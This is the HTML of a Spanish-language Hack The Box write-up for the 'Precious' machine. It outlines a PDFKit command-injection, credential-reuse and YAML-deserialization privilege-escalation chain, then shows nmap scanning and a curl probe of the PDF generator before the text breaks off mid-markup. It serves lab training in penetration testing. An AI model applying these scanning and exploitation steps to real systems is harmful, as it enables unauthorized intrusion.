<!DOCTYPE html><html lang="en" class="scroll-smooth" data-astro-cid-37fxchfa> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/ico" href="/favicon.ico"><meta name="generator" content="Astro v4.0.8"><!-- Canonical URL --><link rel="canonical" href="https://blog-template-gray.vercel.app/post/precious/"><!-- Primary Meta Tags --><title>Precious - HTB Writeup • Fullaw4ke Blog</title><!-- ViewTransitions  --><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><!-- SEO --><meta name="title" content="Precious - HTB Writeup • Fullaw4ke Blog"><meta name="description" content="Explotamos una version vulnerable de PDFKit, luego abusamos de un script con permisos SUDO."><meta name="author" content="Fullaw4ke"><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://blog-template-gray.vercel.app/post/precious/"><meta property="og:title" content="Precious - HTB Writeup"><meta property="og:description" content="Explotamos una version vulnerable de PDFKit, luego abusamos de un script con permisos SUDO."><meta property="og:image" content="https://blog-template-gray.vercel.app/_astro/1.sfSfHnin.png"><meta property="article:author" content="Fullaw4ke"><meta property="article:published_time" content="2022-07-02T04:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://blog-template-gray.vercel.app/post/precious/"><meta property="twitter:title" content="Precious - HTB Writeup"><meta property="twitter:description" content="Explotamos una version vulnerable de PDFKit, luego abusamos de un script con permisos SUDO."><meta property="twitter:image" content="https://blog-template-gray.vercel.app/_astro/1.sfSfHnin.png"><!-- RSS auto-discovery --><link rel="alternate" type="application/rss+xml" title="Fullaw4ke Blog" href="/rss.xml"><link as="font" crossorigin rel="preload" href="/fonts/Manrope-Bold.woff2" type="font/woff2"><style>@font-face {font-weight: 200;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraLight.woff2)}</style><style>@font-face {font-weight: 300;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Light.woff2)}</style><style>@font-face {font-weight: 400;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Regular.woff2)}</style><style>@font-face {font-weight: 500;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Medium.woff2)}</style><style>@font-face {font-weight: 600;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-SemiBold.woff2)}</style><style>@font-face {font-weight: 700;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Bold.woff2)}</style><style>@font-face {font-weight: 800;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraBold.woff2)}</style><style>@font-face { font-family: _font_fallback_1728652588623; size-adjust: 103.76%; src: local('Arial'); ascent-override: 102.74%; descent-override: 28.91%; line-gap-override: 0.00%; }</style><script>
	function getTheme() {
		const storedTheme = typeof localStorage !== 'undefined' && localStorage.getItem('theme')

		return (
			storedTheme || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'light' : 'dark')
		)
	}

	function setTheme(newTheme) {
		const html = document.documentElement
		const isDark = newTheme === 'dark'

		html.classList.toggle('dark', isDark)
		html.classList.toggle('light', !isDark)

		localStorage.setItem('theme', newTheme)
	}

	// set initial theme
	setTheme(getTheme())
	document.addEventListener('astro:after-swap', () => setTheme(getTheme()))

	document.addEventListener('theme-change', (e) => {
		setTheme(e.detail.theme)
	})
</script><script>
	if (!('animations' in localStorage)) {
		localStorage.setItem('animations', 'true')
	} else {
		localStorage.setItem('animations', 'false')
	}
</script><link rel="stylesheet" href="/_astro/_page_.oLAkEadO.css" />
<link rel="stylesheet" href="/_astro/_slug_.m5WJ7WE5.css" /><script type="module" src="/_astro/hoisted.cZ5bdfWX.js"></script></head> <body class="bg-white text-stone-950 dark:bg-[#0a0910] dark:text-white" data-astro-cid-37fxchfa> <main class="px-5 sm:mx-auto sm:max-w-2xl sm:px-8 lg:px-0 antialiased md:max-w-6xl grid gap-12 mt-4 overflow-hidden md:overflow-visible" data-astro-cid-37fxchfa> <header class="relative flex items-center h-12 font-semibold"> <a class="text-lg mr-auto" href="/">Home</a> <div id="astro-header-drawer" class="shadow rounded-l-lg md:bg-transparent dark:md:bg-transparent bg-white dark:bg-[#0a0910] md:shadow-none md:rounded-none md:border-none md:h-auto md:static absolute transition-transform duration-300 ease-in translate-x-96 md:translate-x-0 top-12 -right-5 pl-4 pt-6 pb-4 md:p-0 h-[200px] w-[200px] z-50"> <nav class="flex h-full flex-col justify-between gap-12 text-left md:flex-row md:w-full md:gap-5"> <div class="flex flex-col gap-4 md:flex-row md:border-r-2 border-black pr-4 dark:border-white"> <a href="/tags" class="text-opacity-60 flex items-center gap-1 text-2xl md:text-base" rel="noopener noreferrer ">  <svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M7.859 6h-2.834a2.025 2.025 0 0 0 -2.025 2.025v2.834c0 .537 .213 1.052 .593 1.432l6.116 6.116a2.025 2.025 0 0 0 2.864 0l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-6.117 -6.116a2.025 2.025 0 0 0 -1.431 -.593z"></path> <path d="M17.573 18.407l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-7.117 -7.116"></path> <path d="M6 9h-.01"></path> </svg> Tags
 </a> </div> <div class="flex justify-center items-center md:justify-end gap-3 md:p-0"> <a href="https://github.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Github">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path> </svg> </span>  </a><a href="https://x.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Twitter">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c0 -.249 1.51 -2.772 1.818 -4.013z"></path> </svg> </span>  </a> </div> </nav> </div> <div class="flex items-center gap-3 md:pl-3" data-astro-transition-persist="navbar"> <div> <site-search id="search" class="ms-auto"> <button data-open-modal disabled class="flex items-center justify-center rounded-md gap-1"> <svg aria-label="search" class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"> <path stroke="none" d="M0 0h24v24H0z"></path> <path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6"></path> </svg> <!-- <span class='md:hidden text-2xl'> Search</span> --> </button> <dialog aria-label="search" class="h-full max-h-full w-full max-w-full border border-zinc-400 bg-white dark:bg-[#0a0910ec] shadow backdrop:backdrop-blur sm:mx-auto sm:mb-auto sm:mt-16 sm:h-max sm:max-h-[calc(100%-8rem)] sm:min-h-[15rem] sm:w-5/6 sm:max-w-[48rem] sm:rounded-md opacity-0"> <div class="dialog-frame flex flex-col gap-4 p-6 pt-12 sm:pt-6"> <button data-close-modal class="ms-auto cursor-pointer rounded-full bg-black text-white px-4 py-2 dark:bg-white dark:text-black">Close</button> <div class="search-container dark:text-white"> <div id="pagefind__search"></div> </div> </div> </dialog> </site-search>   </div>  <theme-toggle class="relative h-6 w-6"> <button id="toggle-theme" class="group" aria-label="Toggle Theme"> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-pressed:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun-high" width="24" height="24" viewBox="0 0 24 24" stroke-width="1" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z"></path> <path d="M6.343 17.657l-1.414 1.414"></path> <path d="M6.343 6.343l-1.414 -1.414"></path> <path d="M17.657 6.343l1.414 -1.414"></path> <path d="M17.657 17.657l1.414 1.414"></path> <path d="M4 12h-2"></path> <path d="M12 4v-2"></path> <path d="M20 12h2"></path> <path d="M12 20v2"></path> </svg> </span> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-[pressed=false]:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path> </svg> </span> </button> </theme-toggle> <script>
	const button = document.getElementById('toggle-theme')

	function setButtonPresssed() {
		const bodyThemeIsDark = document.documentElement.classList.contains('dark')
		button.setAttribute('aria-pressed', String(bodyThemeIsDark))
	}
	setButtonPresssed()
</script> <button id="astro-header-drawer-button" type="button" class="md:ml-6 md:hidden"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M4 6l16 0"></path> <path d="M4 12l16 0"></path> <path d="M4 18l16 0"></path> </svg> <span class="sr-only">Show Menu</span> </button> </div> </header>   <article class="min-w-full md:py-4 sm:max-w-none md:max-w-none"> <header class="mb-3 flex flex-col justify-center items-center gap-6"> <div class="flex flex-col gap-2"> <div class="flex items-center justify-center gap-x-1"> <p class="text-center text-sm text-opacity-50">
Published <time class="text-sm font-bold text-opacity-60" datetime="2022-07-02T04:00:00.000Z"> Jul 2, 2022 </time> </p> <p class="text-center text-sm text-opacity-50 font-bold">
- 5 min read </p> </div> <h1 class="text-center text-4xl md:text-6xl md:pb-2.5 font-semibold"> Precious - HTB Writeup </h1> </div> <div class="flex flex-wrap justify-center items-center gap-2 gap-y-4 md:gap-5"> <a href="/tags/easy" aria-label="Easy"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> Easy </span> </a><a href="/tags/linux" aria-label="Linux"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> Linux </span> </a> </div> </header> <img src="/_astro/1.sfSfHnin_1LNBXk.jpg" loading="eager" class="rounded-md w-full max-h-[300px]  md:max-h-[500px] my-8 object-cover" alt="img of Precious - HTB Writeup" width="1000" height="500" decoding="async"> <hr> <div>  <div class="grid grid-cols-1 md:grid-cols-[20%_auto] gap-10 mt-8"> <!-- aside  --> <aside class="md:flex flex-col gap-8 hidden"> <div class="flex flex-col gap-2"> <span class="mb-1 font-bold text-2xl">Share</span> <ul class="flex gap-3 text-black dark:text-white"> <li> <a href="https://twitter.com/intent/tweet?text=Share this post https://blog-template-gray.vercel.app/post/precious/" aria-label="Share on Twitter"><!--?xml version="1.0" ?--><svg height="32px" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:2;" version="1.1" viewBox="0 0 512 512" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M448,512l-384,0c-35.328,0 -64,-28.672 -64,-64l0,-384c0,-35.328 28.672,-64 64,-64l384,0c35.328,0 64,28.672 64,64l0,384c0,35.328 -28.672,64 -64,64Z" id="Dark_Blue" style="fill:#1da1f2;fill-rule:nonzero;"></path><path d="M196.608,386.048c120.704,0 186.752,-100.096 186.752,-186.752c0,-2.816 0,-5.632 -0.128,-8.448c12.8,-9.216 23.936,-20.864 32.768,-34.048c-11.776,5.248 -24.448,8.704 -37.76,10.368c13.568,-8.064 23.936,-20.992 28.928,-36.352c-12.672,7.552 -26.752,12.928 -41.728,15.872c-12.032,-12.8 -29.056,-20.736 -47.872,-20.736c-36.224,0 -65.664,29.44 -65.664,65.664c0,5.12 0.64,10.112 1.664,14.976c-54.528,-2.688 -102.912,-28.928 -135.296,-68.608c-5.632,9.728 -8.832,20.992 -8.832,33.024c0,22.784 11.648,42.88 29.184,54.656c-10.752,-0.384 -20.864,-3.328 -29.696,-8.192l0,0.896c0,31.744 22.656,58.368 52.608,64.384c-5.504,1.536 -11.264,2.304 -17.28,2.304c-4.224,0 -8.32,-0.384 -12.288,-1.152c8.32,26.112 32.64,45.056 61.312,45.568c-22.528,17.664 -50.816,28.16 -81.536,28.16c-5.248,0 -10.496,-0.256 -15.616,-0.896c28.928,18.432 63.488,29.312 100.48,29.312" id="Logo__x2014__FIXED" style="fill:#fff;fill-rule:nonzero;"></path></g></svg></a> </li> <li> <a href="https://www.linkedin.com/shareArticle?mini=true&#38;url=https://blog-template-gray.vercel.app/post/precious/" aria-label="Share on LinkedIn"> <svg enable-background="new 0 0 32 32" height="32px" id="Layer_1" version="1.0" viewBox="0 0 32 32" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M32,30c0,1.104-0.896,2-2,2H2c-1.104,0-2-0.896-2-2V2c0-1.104,0.896-2,2-2h28c1.104,0,2,0.896,2,2V30z" fill="#007BB5"></path><g><rect fill="#FFFFFF" height="14" width="4" x="7" y="11"></rect><path d="M20.499,11c-2.791,0-3.271,1.018-3.499,2v-2h-4v14h4v-8c0-1.297,0.703-2,2-2c1.266,0,2,0.688,2,2v8h4v-7    C25,14,24.479,11,20.499,11z" fill="#FFFFFF"></path><circle cx="9" cy="8" fill="#FFFFFF" r="2"></circle></g></g><g></g><g></g><g></g><g></g><g></g><g></g></svg></a> </li> </ul> </div> <div class="sticky top-24 self-start hidden md:block transition-all duration-200"> <nav class="max-w-xs dark:text-black"> <p class="font-bold mb-3 text-2xl dark:text-white">Index</p> <ul class="[text-wrap:balance] flex flex-col gap-1"> <li class="flex flex-col"> <a href="#initial-recon" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Initial Recon </a>  </li><li class="flex flex-col"> <a href="#web" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Web </a>  </li><li class="flex flex-col"> <a href="#pdf-generator" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> PDF Generator </a>  </li><li class="flex flex-col"> <a href="#cve-2022-25765" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> CVE-2022-25765 </a>  </li><li class="flex flex-col"> <a href="#privilege-escalation" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Privilege Escalation </a>  </li><li class="flex flex-col"> <a href="#ruby" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Ruby </a>  </li><li class="flex flex-col"> <a href="#henry" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Henry </a>  </li><li class="flex flex-col"> <a href="#alternative-solution" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Alternative Solution </a>  </li> </ul> </nav> </div> </aside> <!-- post --> <article class="max-w-full w-full"> <div class="prose prose-lg md:prose-xl dark:prose-invert mb-12 min-w-full"> <p>Precious es una máquina linux sencilla creada por Nauten en Hack the Box que cuenta con un servidor web que utiliza una versión de PDFKit vulnerable a CVE-2022-25765, que puede ser explotada para ejecutar comandos como el usuario ruby. Dentro del directorio personal de este usuario encontramos una carpeta que contiene un archivo de configuración con las credenciales de otro usuario llamado henry. Como henry, podemos ejecutar un script en particular como root a través del comando sudo. Este script es vulnerable a una forma de deserialización de YAML, que nos lleva a la ejecución de código como root.</p>
<h1 id="initial-recon">Initial Recon</h1>
<p>Primero vamos a configurar nuestro entorno y ejecutar un puerto TCP.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@Kali</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#C792EA">export</span><span style="color:#B07D48;--shiki-dark:#BABED8"> rhost</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.11.189</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Target IP address</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#C792EA">export</span><span style="color:#B07D48;--shiki-dark:#BABED8"> lhost</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.14.4</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Your VPN IP address</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> rhost=</span><span style="color:#B07D48;--shiki-dark:#BABED8">$rhost</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .env</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> lhost=</span><span style="color:#B07D48;--shiki-dark:#BABED8">$lhost</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .env</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">.</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ./.env</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> sudo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sS</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p-</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --open</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --min-rate</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3000</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -vvv</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $rhost</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -oG</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span></span></code></pre> 
<p>Los puertos TCP abiertos reportados en el escaneo incluyen:</p>























<table><thead><tr><th>Port</th><th>Service</th><th>Product</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>ssh</td><td>OpenSSH</td><td>8.4p1</td></tr><tr><td>80</td><td>HTTP</td><td>nginx</td><td>1.18.0</td></tr></tbody></table>
<p>l escaneo también informa que el puerto 80 responde con una redirección a <a href="http://precious.htb/">http://precious.htb/</a> . Añadamos este nombre de host a nuestro archivo /etc/hosts.</p>
<h1 id="web">Web</h1>
<p>Empezaremos visitando <a href="http://precious.htb/">http://precious.htb/</a> en nuestro navegador favorito.</p>
<p><img src="/_astro/2.57QDk9gX_Z2lBM38.webp" alt="alt text" width="1094" height="454" loading="lazy" decoding="async"></p>
<p>La página aparentemente tiene alguna funcionalidad que convertirá el contenido de una URL dada en un documento PDF.</p>
<h2 id="pdf-generator">PDF Generator</h2>
<p>Al enviar una URL ficticia a través del formulario web, observamos una petición de nuestro navegador con BurpSuite.</p>
<p><img src="/_astro/3.euZigyTq_ZoMA7R.webp" alt="alt text" width="1022" height="594" loading="lazy" decoding="async"></p>
<p>La petición sólo pasa la URL enviada al servidor. Vamos a probar esta funcionalidad en nuestro propio servidor HTTP.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@Kali</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">mkdir</span><span style="color:#B56959;--shiki-dark:#C3E88D"> share</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#998418;--shiki-dark:#82AAFF"> cd</span><span style="color:#B56959;--shiki-dark:#C3E88D"> share</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">&lt;p&gt;Hello!&lt;/p&gt;</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> index.html</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">python3</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -m</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http.server</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --bind</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $lhost</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8080</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@Kali</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">curl</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -d</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">url=http://</span><span style="color:#B56959;--shiki-dark:#BABED8">$lhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">:8080/</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http://precious.htb/</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -o</span><span style="color:#B56959;--shiki-dark:#C3E88D"> response.bin</span></span></code></pre> 
<p>Recibimos una petición a nuestro servidor HTTP y posteriormente recibimos el resultado PDF.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" 